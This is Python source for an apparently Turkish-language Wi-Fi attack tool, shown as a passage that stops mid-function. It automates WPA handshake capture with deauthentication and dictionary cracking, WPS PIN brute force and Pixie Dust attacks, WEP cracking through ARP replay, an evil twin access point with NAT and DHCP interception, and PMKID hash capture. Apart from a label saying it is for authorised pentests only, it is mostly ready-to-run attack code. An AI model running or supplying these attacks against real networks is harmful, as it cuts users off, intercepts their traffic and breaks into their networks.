#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════╗
║                    WIFIX.py v4.0                            ║
║     Kapsamlı Wi-Fi & Ağ Güvenlik Denetim Aracı               ║
║     30+ Araç | 15 Hack | 15 Güvenlik | Bettercap+Ettercap    ║
║     Yalnızca Yetkili Pentest ve Eğitim Amaçlıdır            ║
╚══════════════════════════════════════════════════════════════╝

Bağımlılıklar:
    sudo apt install -y aircrack-ng reaver bully macchanger nmap arp-scan \
                        bettercap ettercap-gtk wireshark tshark
    pip3 install scapy requests colorama netifaces pandas
"""

import os, sys, time, re, signal, threading, subprocess, socket
import ipaddress, json, datetime, random, csv, struct, hashlib
from typing import List, Dict, Optional, Tuple, Any
from collections import defaultdict, Counter
from queue import Queue, Empty
from enum import Enum
import tempfile

# ============================================================
# GUVENLIK KONTROLU
# ============================================================
print("\n" + "=" * 70)
print("  WIFIX.py v4.0 - Wi-Fi & Ağ Güvenlik Denetim Aracı")
print("  30+ Araç | 15 Hack | 15 Güvenlik | Bettercap+Ettercap")
print("  YALNIZCA YETKILI PENTEST ICIN KULLANIN")
print("=" * 70 + "\n")

# ============================================================
# RENK TANIMLARI
# ============================================================
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    MAGENTA = '\033[35m'
    WHITE = '\033[37m'
    DARKGREY = '\033[90m'
    LIGHTRED = '\033[91m'
    LIGHTGREEN = '\033[92m'
    LIGHTYELLOW = '\033[93m'
    LIGHTBLUE = '\033[94m'
    LIGHTMAGENTA = '\033[95m'
    LIGHTCYAN = '\033[96m'

def c(color, text):
    return color + str(text) + Colors.ENDC

def banner():
    print(c(Colors.HEADER, """
    ╔══════════════════════════════════════════════════════════════╗
    ║  ██╗    ██╗██╗███████╗██╗██╗  ██╗   ██╗   ██╗██████╗     ║
    ║  ██║    ██║██║██╔════╝██║╚██╗██╔╝   ██║   ██║██╔══██╗    ║
    ║  ██║ █╗ ██║██║█████╗  ██║ ╚███╔╝    ██║   ██║██████╔╝    ║
    ║  ██║███╗██║██║██╔══╝  ██║ ██╔██╗    ██║   ██║██╔══██╗    ║
    ║  ╚███╔███╔╝██║██║     ██║██╔╝ ██╗   ╚██████╔╝██║  ██║    ║
    ║   ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝    ║
    ║     Wi-Fi & Ağ Pentest v4.0                                ║
    ║     30+ Araç | Bettercap | Ettercap                        ║
    ╚══════════════════════════════════════════════════════════════╝
    """))

# ============================================================
# YARDIMCI FONKSIYONLAR (Genişletilmiş)
# ============================================================

def check_root():
    if os.geteuid() != 0:
        print(c(Colors.FAIL, "[!] Bu araç root yetkisi gerektirir!"))
        print(c(Colors.WARNING, "[*] sudo python3 wifix_v4.py ile çalıştırın"))
        sys.exit(1)

def check_dependencies():
    """Genişletilmiş bağımlılık kontrolü (Bettercap, Ettercap dahil)"""
    required_tools = {
        'airmon-ng': 'aircrack-ng', 'airodump-ng': 'aircrack-ng',
        'aireplay-ng': 'aircrack-ng', 'aircrack-ng': 'aircrack-ng',
        'airbase-ng': 'aircrack-ng', 'reaver': 'reaver',
        'bully': 'bully', 'macchanger': 'macchanger',
        'nmap': 'nmap', 'arp-scan': 'arp-scan',
        'iw': 'iw', 'iwconfig': 'wireless-tools',
        'bettercap': 'bettercap', 'ettercap': 'ettercap-common',
        'tshark': 'tshark', 'hcxdumptool': 'hcxtools',
        'hcxpcapngtool': 'hcxtools'
    }
    missing = []
    for tool, pkg in required_tools.items():
        result = subprocess.run(['which', tool], capture_output=True, text=True)
        if result.returncode != 0:
            missing.append(pkg)

    if missing:
        print(c(Colors.WARNING, "[*] Eksik bağımlılıklar tespit edildi:"))
        for pkg in sorted(set(missing)):
            print(c(Colors.WARNING, f"    sudo apt install -y {pkg}"))
        choice = input(c(Colors.OKCYAN, "\n[?] Devam etmek istiyor musunuz? (e/h): "))
        if choice.lower() != 'e':
            sys.exit(1)

def run_command(cmd: str, timeout: int = 60, shell: bool = True, 
                capture: bool = True) -> Tuple[int, str, str]:
    """Gelişmiş komut çalıştırma (arkaplan desteği ile)"""
    try:
        if capture:
            result = subprocess.run(cmd, shell=shell, capture_output=True, 
                                    text=True, timeout=timeout)
            return result.returncode, result.stdout, result.stderr
        else:
            result = subprocess.Popen(cmd, shell=shell)
            return result.pid, "", ""
    except subprocess.TimeoutExpired:
        return -1, "", "TIMEOUT"
    except Exception as e:
        return -1, "", str(e)

def run_bg(cmd: str) -> subprocess.Popen:
    """Arka planda komut çalıştır"""
    return subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, 
                            stderr=subprocess.DEVNULL)

def get_wireless_interfaces() -> List[str]:
    result = run_command("iw dev 2>/dev/null | grep 'Interface' | awk '{print $2}'")
    interfaces = [i for i in result[1].split('\n') if i]
    return interfaces

def get_all_interfaces() -> List[str]:
    result = run_command("ip -o link show | awk -F': ' '{print $2}'")
    interfaces = [i.strip() for i in result[1].split('\n') 
                  if i.strip() and i.strip() != 'lo']
    return interfaces

def enable_monitor_mode(interface: str) -> Optional[str]:
    """Gelişmiş monitor modu (alternatif yöntemlerle)"""
    print(c(Colors.OKCYAN, f"[*] {interface} için monitor modu etkinleştiriliyor..."))
    
    run_command(f"airmon-ng stop {interface}mon 2>/dev/null")
    run_command(f"airmon-ng check kill 2>/dev/null")
    time.sleep(0.5)
    
    # Yöntem 1: airmon-ng
    ret, out, err = run_command(f"airmon-ng start {interface}")
    if 'monitor mode enabled' in out.lower() or 'monitor mode' in err.lower():
        mon = f"{interface}mon"
        print(c(Colors.OKGREEN, f"[+] Monitor modu etkin: {mon}"))
        return mon
    
    # Yöntem 2: iw ile manuel
    run_command(f"ip link set {interface} down")
    run_command(f"iw dev {interface} set type monitor")
    run_command(f"ip link set {interface} up")
    
    ret2, out2, _ = run_command(f"iwconfig {interface} | grep -i mode")
    if 'monitor' in out2.lower():
        print(c(Colors.OKGREEN, f"[+] Monitor modu etkin: {interface}"))
        return interface
    
    # Yöntem 3: rfkill sıfırlama
    run_command("rfkill unblock all")
    time.sleep(0.5)
    run_command(f"ip link set {interface} down")
    run_command(f"iw dev {interface} set type monitor")
    run_command(f"ip link set {interface} up")
    
    print(c(Colors.FAIL, "[!] Monitor modu etkinleştirilemedi!"))
    return None

def disable_monitor_mode(interface: str):
    """Gelişmiş monitor modu kapatma + servis onarımı"""
    print(c(Colors.WARNING, "[*] Monitor modu kapatılıyor..."))
    base_iface = interface.replace('mon', '') if interface.endswith('mon') else interface
    run_command(f"airmon-ng stop {interface} 2>/dev/null")
    run_command(f"airmon-ng stop {base_iface}mon 2>/dev/null")
    run_command(f"ip link set {interface} down")
    run_command(f"iw dev {interface} set type managed 2>/dev/null")
    run_command(f"ip link set {interface} up")
    run_command("systemctl restart NetworkManager 2>/dev/null")
    run_command("systemctl restart networking 2>/dev/null")
    print(c(Colors.OKGREEN, "[+] Ağ servisleri yeniden başlatıldı"))

def randomize_mac(interface: str) -> bool:
    print(c(Colors.OKCYAN, f"[*] {interface} MAC adresi rastgeleleştiriliyor..."))
    run_command(f"ip link set {interface} down")
    ret, out, err = run_command(f"macchanger -r {interface}")
    run_command(f"ip link set {interface} up")
    if ret == 0:
        for line in out.split('\n'):
            if 'New MAC' in line or 'Current MAC' in line:
                new_mac = line.split()[-1]
                print(c(Colors.OKGREEN, f"[+] Yeni MAC: {new_mac}"))
                return True
    return False

def set_mac(interface: str, mac: str) -> bool:
    run_command(f"ip link set {interface} down")
    ret, _, _ = run_command(f"macchanger -m {mac} {interface}")
    run_command(f"ip link set {interface} up")
    return ret == 0

def get_default_gateway() -> str:
    ret, out, _ = run_command("ip route | grep default | awk '{print $3}' | head -1")
    return out.strip() if out.strip() else "192.168.1.1"

def get_local_network() -> str:
    ret, out, _ = run_command("ip route | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+/\\d+' | head -1")
    return out.strip() if out.strip() else "192.168.1.0/24"

def get_public_ip() -> str:
    ret, out, _ = run_command("curl -s ifconfig.me 2>/dev/null || curl -s icanhazip.com 2>/dev/null")
    return out.strip() if out.strip() else "N/A"

def channel_to_freq(channel: int) -> int:
    """Kanal numarasını frekansa çevir (2.4 GHz ve 5 GHz)"""
    if 1 <= channel <= 13:
        return 2412 + (channel - 1) * 5
    elif channel == 14:
        return 2484
    elif 36 <= channel <= 165:
        return 5000 + channel * 5
    return 0

def freq_to_channel(freq: int) -> int:
    if 2412 <= freq <= 2484:
        return (freq - 2412) // 5 + 1
    elif 5000 <= freq <= 6000:
        return (freq - 5000) // 5
    return 0

# ============================================================
# RAPORLAMA SISTEMI (Gelişmiş)
# ============================================================

class ReportManager:
    def __init__(self):
        self.reports = []
        self.start_time = datetime.datetime.now()
        self.screenshot_paths = []

    def add(self, module: str, data: dict):
        self.reports.append({
            'timestamp': datetime.datetime.now().isoformat(),
            'module': module,
            'data': data
        })

    def add_screenshot(self, path: str):
        self.screenshot_paths.append(path)

    def summary(self) -> str:
        lines = []
        lines.append("=" * 70)
        lines.append("  WIFIX v4.0 - TARAMA ÖZETİ")
        lines.append("=" * 70)
        lines.append(f"  Başlangıç: {self.start_time.isoformat()}")
        lines.append(f"  Bitiş:     {datetime.datetime.now().isoformat()}")
        lines.append(f"  Süre:      {datetime.datetime.now() - self.start_time}")
        lines.append(f"  Modül:     {len(self.reports)}")
        lines.append("-" * 70)
        for i, r in enumerate(self.reports, 1):
            lines.append(f"  [{i}] {r['module']} - {r['timestamp'][:19]}")
        lines.append("-" * 70)
        return "\n".join(lines)

    def save(self, filename: str = None) -> str:
        if not filename:
            filename = f"/tmp/wifix_report_{int(time.time())}.json"
        report = {
            'tool': 'WIFIX.py v4.0',
            'authorized': True,
            'start_time': self.start_time.isoformat(),
            'end_time': datetime.datetime.now().isoformat(),
            'modules_used': len(self.reports),
            'results': self.reports
        }
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        print(c(Colors.OKGREEN, f"[+] Rapor kaydedildi: {filename}"))
        return filename

    def save_html(self, filename: str = None) -> str:
        if not filename:
            filename = f"/tmp/wifix_report_{int(time.time())}.html"
        
        html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8">
<title>WIFIX v4.0 Raporu</title>
<style>
body {{ font-family: monospace; margin: 20px; background: #1a1a2e; color: #e0e0e0; }}
h1 {{ color: #00ff88; }}
h2 {{ color: #00aaff; }}
.module {{ border-left: 3px solid #00ff88; margin: 10px 0; padding: 10px; background: #16213e; }}
.data {{ white-space: pre-wrap; color: #ccc; }}
.footer {{ margin-top: 30px; color: #666; }}
</style></head><body>
<h1>🔍 WIFIX v4.0 - Güvenlik Denetim Raporu</h1>
<p><strong>Başlangıç:</strong> {self.start_time.isoformat()}</p>
<p><strong>Bitiş:</strong> {datetime.datetime.now().isoformat()}</p>
<p><strong>Modül Sayısı:</strong> {len(self.reports)}</p>
<hr>"""
        for i, r in enumerate(self.reports, 1):
            html += f"""<div class="module">
<h2>[{i}] {r['module']}</h2>
<p><em>{r['timestamp'][:19]}</em></p>
<div class="data">{json.dumps(r['data'], indent=2, ensure_ascii=False)}</div>
</div>"""
        html += f"""<div class="footer">
<p>WIFIX v4.0 - Yetkili Pentest Aracı</p>
</div></body></html>"""
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
        print(c(Colors.OKGREEN, f"[+] HTML rapor: {filename}"))
        return filename

report_mgr = ReportManager()

# ============================================================
# HACK MODUL 1: WPA/WPA2 Handshake (Gelişmiş)
# ============================================================

def hack_wpa_handshake(mon_iface: str):
    """WPA/WPA2 handshake yakalama + PMKID destekli"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [H1] WPA/WPA2 HANDSHAKE SALDIRISI"))
    print(c(Colors.HEADER, "=" * 70))
    
    print(c(Colors.OKCYAN, "\n[!] Hedef seçenekleri:"))
    print("  1 - Belirli bir hedefe saldır")
    print("  2 - Tüm ağları tara (otomatik)")
    
    choice = input(c(Colors.OKCYAN, "[?] Seçiminiz (1-2): "))
    
    bssid = channel = essid = ""
    
    if choice == '1':
        bssid = input(c(Colors.OKCYAN, "[?] Hedef BSSID (00:11:22:33:44:55): "))
        channel = input(c(Colors.OKCYAN, "[?] Kanal: "))
        essid = input(c(Colors.OKCYAN, "[?] ESSID: "))
        
        if not bssid or len(bssid) != 17:
            print(c(Colors.FAIL, "[!] Geçerli bir BSSID girin!"))
            return False
        if channel:
            run_command(f"iw dev {mon_iface} set channel {channel}")
            time.sleep(0.5)
    else:
        print(c(Colors.OKCYAN, "[*] Tüm ağlar taranıyor (20 saniye)..."))
        nets, _ = wifi_scan(mon_iface, duration=20)
        if not nets:
            print(c(Colors.FAIL, "[!] Hiç ağ bulunamadı!"))
            return False
        print(c(Colors.OKCYAN, "\n[!] Hedef ağı seçin:"))
        for i, net in enumerate(nets[:20]):
            pwr = net.get('power', '0')
            print(f"  {i+1}. {net['essid'][:25]:<25} {net['bssid']:<18} CH:{net.get('channel','?')} Sinyal:{pwr}")
        sel = input(c(Colors.OKCYAN, "[?] Seçim (1-{}): ".format(len(nets[:20]))))
        try:
            idx = int(sel) - 1
            target = nets[idx]
            bssid = target['bssid']
            channel = target.get('channel', '6')
            essid = target.get('essid', '')
            run_command(f"iw dev {mon_iface} set channel {channel}")
        except:
            print(c(Colors.FAIL, "[!] Geçersiz seçim!"))
            return False
    
    capture_file = f"/tmp/handshake_{int(time.time())}"
    
    print(c(Colors.OKCYAN, f"\n[*] Handshake yakalama başlatılıyor: {essid} ({bssid})"))
    print(c(Colors.WARNING, "[*] airodump-ng çalışıyor (arka planda)..."))
    
    dump_proc = run_bg(f"airodump-ng -c {channel} --bssid {bssid} "
                       f"-w {capture_file} {mon_iface} 2>/dev/null")
    time.sleep(3)
    
    print(c(Colors.WARNING, "[*] Deauth paketleri gönderiliyor (5 paket)..."))
    run_bg(f"aireplay-ng -0 5 -a {bssid} {mon_iface} 2>/dev/null")
    
    print(c(Colors.OKCYAN, "[*] 30 saniye bekleniyor..."))
    for i in range(30, 0, -1):
        print(f"\r[*] Bekleniyor: {i}s | Hedef: {essid}", end='', flush=True)
        time.sleep(1)
    print()
    
    # Ayrıca PMKID yakala
    pmkid_file = f"/tmp/pmkid_{int(time.time())}"
    print(c(Colors.OKCYAN, "[*] PMKID hash de yakalanıyor (hcxdumptool)..."))
    run_bg(f"hcxdumptool -o {pmkid_file}.pcapng -i {mon_iface} "
           f"--enable_status=1 --filterlist_ap={bssid} 2>/dev/null &")
    time.sleep(5)
    run_command("pkill -f hcxdumptool")
    
    dump_proc.terminate()
    time.sleep(1)
    
    cap_file = f"{capture_file}-01.cap"
    handshake_found = False
    pmkid_found = False
    
    if os.path.exists(cap_file):
        ret, out, _ = run_command(f"aircrack-ng {cap_file} 2>/dev/null | grep -i handshake")
        if 'handshake' in out.lower():
            handshake_found = True
            print(c(Colors.OKGREEN, f"\n[+] ✓ WPA Handshake yakalandı!"))
            print(c(Colors.OKGREEN, f"    Dosya: {cap_file}"))
    
    if os.path.exists(f"{pmkid_file}.pcapng"):
        ret, out, _ = run_command(f"hcxpcapngtool -o {pmkid_file}.hccapx {pmkid_file}.pcapng 2>/dev/null")
        if os.path.exists(f"{pmkid_file}.hccapx"):
            pmkid_found = True
            print(c(Colors.OKGREEN, f"[+] ✓ PMKID hash yakalandı!"))
    
    if handshake_found:
        wordlist = input(c(Colors.OKCYAN, "\n[?] Wordlist yolu (boş=rockyou): "))
        if not wordlist:
            wordlist = "/usr/share/wordlists/rockyou.txt"
            alt_list = ["/usr/share/wordlists/fasttrack.txt", 
                        "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"]
            for alt in alt_list:
                if os.path.exists(alt):
                    wordlist = alt
                    break
        
        if os.path.exists(wordlist):
            print(c(Colors.OKCYAN, f"\n[*] aircrack-ng kırma başlatılıyor..."))
            os.system(f"aircrack-ng -a 2 -b {bssid} -w {wordlist} {cap_file}")
        else:
            print(c(Colors.WARNING, f"[!] Wordlist bulunamadı: {wordlist}"))
            print(c(Colors.OKBLUE, f"[*] Cap dosyası kaydedildi: {cap_file}"))
            print(c(Colors.OKBLUE, f"[*] Hashcat ile kırmak için:"))
            print(f"    hcxpcapngtool -o hash.hccapx {cap_file}")
            print(f"    hashcat -m 2500 hash.hccapx wordlist.txt")
    else:
        print(c(Colors.FAIL, "\n[!] Handshake yakalanamadı!"))
        print(c(Colors.WARNING, "[*] İpuçları:"))
        print("  - Hedefe yakın olduğunuzdan emin olun")
        print("  - Bir istemcinin bağlanmasını bekleyin")
        print("  - Daha agresif deauth deneyin")
    
    # Temizlik
    for f in os.listdir('/tmp'):
        if f.startswith(f"handshake_{int(time.time())-120}") or f.startswith(f"pmkid_{int(time.time())-120}"):
            try:
                os.remove(f"/tmp/{f}")
            except:
                pass
    
    report_mgr.add('WPA_Handshake', {
        'bssid': bssid, 'essid': essid, 'channel': channel,
        'handshake_found': handshake_found,
        'pmkid_found': pmkid_found,
        'cap_file': cap_file if os.path.exists(cap_file) else None
    })
    return True

# ============================================================
# HACK MODUL 2: WPS PIN (Reaver - Gelişmiş)
# ============================================================

def hack_wps_reaver(mon_iface: str):
    """WPS PIN brute force - Reaver ile"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [H2] WPS PIN SALDIRISI - REAVER"))
    print(c(Colors.HEADER, "=" * 70))
    
    bssid = input(c(Colors.OKCYAN, "[?] Hedef BSSID: "))
    channel = input(c(Colors.OKCYAN, "[?] Kanal (boş=6): "))
    essid = input(c(Colors.OKCYAN, "[?] ESSID (opsiyonel): "))
    pin = input(c(Colors.OKCYAN, "[?] PIN kodu (boş=brute force): "))
    
    if not bssid or len(bssid) != 17:
        print(c(Colors.FAIL, "[!] Geçerli BSSID girin!"))
        return False
    
    if channel:
        run_command(f"iw dev {mon_iface} set channel {channel}")
    
    print(c(Colors.WARNING, "\n[!] Reaver saldırı seçenekleri:"))
    print("  1 - Normal WPS PIN brute force")
    print("  2 - Pixie Dust saldırısı (hızlı)")
    print("  3 - Null PIN test")
    print("  4 - Known PIN test (default PIN'ler)")
    
    rchoice = input(c(Colors.OKCYAN, "[?] Seçim (1-4): "))
    
    base_cmd = f"reaver -i {mon_iface} -b {bssid} -vv -L -N -d 5"
    if essid:
        base_cmd += f" -e '{essid}'"
    if pin:
        base_cmd += f" -p {pin}"
    
    if rchoice == '1':
        cmd = base_cmd
        print(c(Colors.OKCYAN, f"\n[*] Reaver WPS brute force: {bssid}"))
    elif rchoice == '2':
        cmd = base_cmd + " -K 1"
        print(c(Colors.OKCYAN, f"\n[*] Pixie Dust saldırısı: {bssid}"))
    elif rchoice == '3':
        cmd = base_cmd + " -p 00000000"
        print(c(Colors.OKCYAN, f"\n[*] Null PIN test: {bssid}"))
    elif rchoice == '4':
        default_pins = {
            '00:11:22:33:44:55': '12345670',
            # Default PIN database
        }
        known_pin = default_pins.get(bssid.upper(), '')
        if known_pin:
            cmd = base_cmd + f" -p {known_pin}"
            print(c(Colors.OKCYAN, f"\n[*] Known PIN test: {known_pin}"))
        else:
            print(c(Colors.WARNING, "[!] Bilinen PIN bulunamadı, brute force deneniyor..."))
            cmd = base_cmd
    
    print(c(Colors.WARNING, f"\n[*] Çalıştırılıyor: reaver ..."))
    print(c(Colors.WARNING, "[*] Bu işlem saatler sürebilir. Ctrl+C durdurmak için."))
    os.system(cmd)
    
    report_mgr.add('WPS_Reaver', {
        'bssid': bssid, 'essid': essid, 'method': rchoice
    })
    return True

# ============================================================
# HACK MODUL 3: WPS Pixie Dust (Bully)
# ============================================================

def hack_wps_pixie(mon_iface: str):
    """Pixie Dust saldırısı - Bully ile"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [H3] WPS PIXIE DUST SALDIRISI"))
    print(c(Colors.HEADER, "=" * 70))
    
    bssid = input(c(Colors.OKCYAN, "[?] Hedef BSSID: "))
    channel = input(c(Colors.OKCYAN, "[?] Kanal: "))
    essid = input(c(Colors.OKCYAN, "[?] ESSID (opsiyonel): "))
    
    if not bssid or len(bssid) != 17:
        print(c(Colors.FAIL, "[!] Geçerli BSSID girin!"))
        return False
    
    if channel:
        run_command(f"iw dev {mon_iface} set channel {channel}")
    
    print(c(Colors.OKCYAN, "\n[*] Pixie Dust saldırısı başlatılıyor..."))
    cmd = f"bully {mon_iface} -b {bssid} -d -v 3"
    if essid:
        cmd += f" -e '{essid}'"
    
    print(c(Colors.WARNING, f"[*] Bully ile Pixie Dust deneniyor..."))
    os.system(cmd)
    
    # İkinci yöntem: reaver ile
    print(c(Colors.OKCYAN, "\n[*] Reaver ile Pixie Dust de deneniyor..."))
    os.system(f"reaver -i {mon_iface} -b {bssid} -vv -K 1 -N -L -d 3")
    
    report_mgr.add('WPS_Pixie', {'bssid': bssid, 'essid': essid})
    return True

# ============================================================
# HACK MODUL 4: WEP IV Toplama & Kırma
# ============================================================

def hack_wep(mon_iface: str):
    """WEP kırma - ARP replay ile IV toplama"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [H4] WEP IV TOPLAMA & KIRMA"))
    print(c(Colors.HEADER, "=" * 70))
    
    bssid = input(c(Colors.OKCYAN, "[?] Hedef BSSID: "))
    channel = input(c(Colors.OKCYAN, "[?] Kanal: "))
    essid = input(c(Colors.OKCYAN, "[?] ESSID: "))
    
    if not bssid or len(bssid) != 17:
        print(c(Colors.FAIL, "[!] Geçerli BSSID girin!"))
        return False
    
    if channel:
        run_command(f"iw dev {mon_iface} set channel {channel}")
    
    capture_file = f"/tmp/wep_crack_{int(time.time())}"
    
    print(c(Colors.OKCYAN, f"\n[*] WEP kırma: {essid} ({bssid})"))
    print(c(Colors.WARNING, "[*] ARP replay ile IV üretimi başlatılıyor..."))
    
    # airodump'u başlat
    dump_proc = run_bg(f"airodump-ng -c {channel} --bssid {bssid} "
                       f"-w {capture_file} {mon_iface} 2>/dev/null")
    time.sleep(2)
    
    # ARP replay
    replay_proc = run_bg(f"aireplay-ng -3 -b {bssid} {mon_iface} 2>/dev/null")
    
    # Aynı anda fake auth dene (WEP için gerekli olabilir)
    run_bg(f"aireplay-ng -1 0 -e '{essid}' -a {bssid} {mon_iface} 2>/dev/null")
    
    print(c(Colors.WARNING, "\n[*] En az 20.000 IV gerekli. 120 saniye bekleniyor..."))
    for i in range(120, 0, -10):
        print(f"\r[*] Bekleniyor: {i:3d}s | IV: toplanıyor...", end='', flush=True)
        time.sleep(10)
    print()
    
    replay_proc.terminate()
    dump_proc.terminate()
    time.sleep(1)
    
    cap_file = f"{capture_file}-01.cap"
    if os.path.exists(cap_file):
        # IV sayısını kontrol et
        ret, out, _ = run_command(f"aircrack-ng {cap_file} 2>/dev/null")
        
        print(c(Colors.OKCYAN, f"\n[*] aircrack-ng ile WEP kırılıyor..."))
        os.system(f"aircrack-ng -a 1 -b {bssid} {cap_file}")
    else:
        print(c(Colors.FAIL, "[!] Cap dosyası bulunamadı!"))
        print(c(Colors.WARNING, "[*] Alternatif: hedefin WEP kullandığından emin olun"))
    
    report_mgr.add('WEP_Crack', {'bssid': bssid, 'essid': essid})
    return True

# ============================================================
# HACK MODUL 5: Evil Twin + Deauth (Gelişmiş)
# ============================================================

def hack_evil_twin(mon_iface: str):
    """Evil Twin + Deauth + Köprü + DHCP"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [H5] EVIL TWIN + DEAUTH KOMBİNASYONU"))
    print(c(Colors.HEADER, "=" * 70))
    
    print(c(Colors.WARNING, "\n[!] Bu saldırı kurbanın bağlantısını keser!"))
    confirm = input(c(Colors.OKCYAN, "[?] Devam? (evet/hayır): "))
    if confirm.lower() != 'evet':
        return False
    
    essid = input(c(Colors.OKCYAN, "[?] Kopyalanacak ESSID: "))
    channel = input(c(Colors.OKCYAN, "[?] Kanal: "))
    bssid = input(c(Colors.OKCYAN, "[?] Hedef BSSID (deauth için): "))
    interface = input(c(Colors.OKCYAN, "[?] İnternet arayüzü (ör: eth0): "))
    
    if not essid:
        print(c(Colors.FAIL, "[!] ESSID gerekli!"))
        return False
    
    if channel:
        run_command(f"iw dev {mon_iface} set channel {channel}")
    
    # Adım 1: Fake AP
    print(c(Colors.OKCYAN, f"\n[1/4] Fake AP oluşturuluyor: {essid}..."))
    run_bg(f"airbase-ng -e '{essid}' -c {channel or '6'} {mon_iface} 2>/dev/null")
    time.sleep(2)
    
    # Adım 2: Arayüz yapılandırması
    print(c(Colors.OKCYAN, "[2/4] Arayüz yapılandırılıyor..."))
    run_command("ifconfig at0 up 192.168.99.1 netmask 255.255.255.0")
    run_command("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    if interface and os.path.exists(f"/sys/class/net/{interface}"):
        run_command(f"iptables -t nat -A POSTROUTING -o {interface} -j MASQUERADE 2>/dev/null")
        run_command(f"iptables -A FORWARD -i {interface} -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null")
        run_command(f"iptables -A FORWARD -i at0 -o {interface} -j ACCEPT 2>/dev/null")
    
    # Adım 3: DHCP
    print(c(Colors.OKCYAN, "[3/4] DHCP/DNS sunucusu (dnsmasq)..."))
    dhcp_conf = f"/tmp/dhcp_{int(time.time())}.conf"
    with open(dhcp_conf, 'w') as f:
        f.write(f"interface=at0\ndhcp-range=192.168.99.100,192.168.99.200,255.255.255.0,12h\ndhcp-option=3,192.168.99.1\ndhcp-option=6,192.168.99.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\n")
    run_bg(f"dnsmasq -C {dhcp_conf}")
    
    # Adım 4: Deauth
    if bssid and len(bssid) == 17:
        print(c(Colors.WARNING, "[4/4] Deauth saldırısı (hedef bağlantıları kesiliyor)..."))
        run_bg(f"aireplay-ng -0 0 -a {bssid} {mon_iface} 2>/dev/null")
    
    print(c(Colors.OKGREEN, "\n[+] ✓ EVIL TWIN SALDIRISI AKTİF!"))
    print(c(Colors.OKBLUE, "╔═══════════════════════════════════════════╗"))
    print(c(Colors.OKBLUE, "║  Fake AP:") + f" {essid:<30} ║")
    print(c(Colors.OKBLUE, "║  Gateway: 192.168.99.1") + f"{'':<18} ║")
    print(c(Colors.OKBLUE, "║  DHCP: 192.168.99.100-200") + f"{'':<13} ║")
    print(c(Colors.OKBLUE, "║  Kurban: bağlantısı kesiliyor") + f"{'':<7} ║")
    print(c(Colors.OKBLUE, "╚═══════════════════════════════════════════╝"))
    print(c(Colors.WARNING, "\n[*] Durdurmak için Ctrl+C"))
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(c(Colors.WARNING, "\n[!] Temizleniyor..."))
        run_command("pkill -f airbase-ng")
        run_command("pkill -f dnsmasq")
        run_command("pkill -f aireplay-ng")
        run_command("iptables -t nat -F 2>/dev/null")
        run_command("iptables -F 2>/dev/null")
        run_command("ifconfig at0 down 2>/dev/null")
        run_command("echo 0 > /proc/sys/net/ipv4/ip_forward")
        if os.path.exists(dhcp_conf):
            os.remove(dhcp_conf)
    
    report_mgr.add('Evil_Twin', {'essid': essid, 'bssid': bssid, 'channel': channel})
    return True

# ============================================================
# HACK MODUL 6: PMKID Saldırısı
# ============================================================

def hack_pmkid(mon_iface: str):
    """PMKID hash yakalama - WPA3/WPA2 uyumlu"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [H6] PMKID HASH YAKALAMA SALDIRISI"))
    print(c(Colors.HEADER, "=" * 70))
    
    print(c(Colors.OKCYAN, "[*] PMKID, RSN IE içinde AP tarafından gönderilen bir hash'tir."))
    print(c(Colors.OKCYAN, "[*] WPA3 ve WPA2 ağlarda çalışır. İstemci gerekmez!\n"))
    
    bssid = input(c(Colors.OKCYAN, "[?] Hedef BSSID (boş=tüm ağlar): "))
    channel = input(c(Colors.OKCYAN, "[?] Kanal (boş=hepsi): "))
    
    if channel:
        run_command(f"iw dev {mon_iface} set channel {channel}")
    
    output_file = f"/tmp/pmkid_{int(time.time())}"
    
    print(c(Colors.WARNING, "[*] hcxdumptool ile PMKID yakalanıyor (30 saniye)..."))
    
    if bssid:
        filter_file = f"/tmp/pmkid_filter_{int(time.time())}"
        with open(filter_file, 'w') as f:
            f.write(bssid)
        proc = run_bg(f"hcxdumptool -o {output_file}.pcapng -i {mon_iface} "
                      f"--enable_status=1 --filterlist_ap={filter_file} 2>/dev/null")
    else:
        proc = run_bg(f"hcxdumptool -o {output_file}.pcapng -i {mon_iface} "
                      f"--enable_status=1 2>/dev/null")
    
    for i in range(30, 0, -1):
        print(f"\r[*] Bekleniyor: {i:2d}s | PMKID toplanıyor...", end='', flush=True)
        time.sleep(1)
    print()
    
    proc.terminate()
    time.sleep(1)
    
    if os.path.exists(f"{output_file}.pcapng"):
        # Hash'i çıkar
        hash_file = f"{output_file}.hccapx"
        ret, out, _ = run_command(f"hcxpcapngtool -o {hash_file} {output_file}.pcapng 2>/dev/null")
        
        # PMKID sayısını kontrol et
        if os.path.exists(hash_file):
            size = os.path.getsize(hash_file)
            if size > 0:
                print(c(Colors.OKGREEN, f"\n[+] ✓ PMKID hash yakalandı!"))
                print(c(Colors.OKGREEN, f"    Dosya: {hash_file} ({size} bytes)"))
                
                print(c(Colors.OKCYAN, f"\n[*] Hashcat ile kırmak için:"))
                print(f"    hashcat -m 16800 {hash_file} wordlist.txt")
